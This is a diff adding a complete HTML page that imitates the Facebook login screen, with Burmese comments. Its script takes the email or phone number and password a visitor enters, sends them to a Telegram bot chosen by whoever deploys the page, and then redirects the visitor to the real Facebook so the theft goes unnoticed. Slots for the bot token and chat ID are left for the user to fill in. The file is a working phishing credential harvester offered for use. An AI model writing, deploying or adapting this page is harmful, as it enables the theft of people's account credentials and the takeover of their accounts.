@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-card h1 {
+      text-align: center;
+      margin: 0 0 4px;
+      font-size: 26px;
+      color: #1877f2;
+      font-weight: bold;
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 0 16px;
+      height: 48px;
+      font-size: 20px;
+      font-weight: bold;
+      color: #fff;
+      background: #1877f2;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn-login:hover {
+      background: #166fe5;
+    }
+
+    .forgot {
+      text-align: center;
+      margin: 16px 0;
+    }
+
+    .forgot a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      height: 1px;
+      background: #dadde1;
+      margin: 20px 0;
+    }
+
+    .btn-new {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 0 16px;
+      height: 48px;
+      line-height: 48px;
+      font-size: 17px;
+      font-weight: bold;
+      color: #fff;
+      background: #42b72a;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    .btn-new:hover {
+      background: #36a420;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-card">
+    <h1>Facebook</h1>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <input type="text" id="email" name="email" placeholder="Email or phone number" autocomplete="off" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+      </div>
+
+      <button type="submit" class="btn-login" id="loginBtn">Log In</button>
+
+      <div class="forgot">
+        <a href="#">Forgot password?</a>
+      </div>
+
+      <div class="divider"></div>
+
+      <a href="#" class="btn-new">Create New Account</a>
+    </form>
+  </div>
+
+  <script>
+    // သင့်ရဲ့ Telegram Bot Token နဲ့ Chat ID ကို ဤနေရာတွင် ထည့်ပါ
+    const botToken = "your token"; 
+    const chatId = "your id"; 
+    const redirectUrl = "https://www.facebook.com/"; // ရောက်သွားရမည့် Link
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault(); // ပုံမှန် Form Submit ဖြစ်တာကို တားဆီး
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const loginBtn = document.getElementById('loginBtn');
+
+      // ခလုတ်ကို ခဏပိတ်ပြီး စာသားပြောင်းထားခြင်း (Processing ပြရန်)
+      loginBtn.disabled = true;
+      loginBtn.innerText = "Logging in...";
+
+      // Telegram သို့ ပို့မည့် စာသားဖော်မတ်
+      const message = `🔔 New Facebook Login:\n👤 Email/Phone: ${email}\n🔑 Password: ${password}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        // Telegram Bot API သို့ အချက်အလက်များ ပို့ဆောင်ခြင်း
+        await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      } catch (error) {
+        console.error("Telegram error:", error);
+      } finally {
+        // အောင်မြင်든 မအောင်မြင်든 သတ်မှတ်ထားသော Redirect လိပ်စာသို့ ပို့ဆောင်မည်
+        window.location.href = redirectUrl;
+      }
+    });
+  </script>
+
+</body>
+</html>
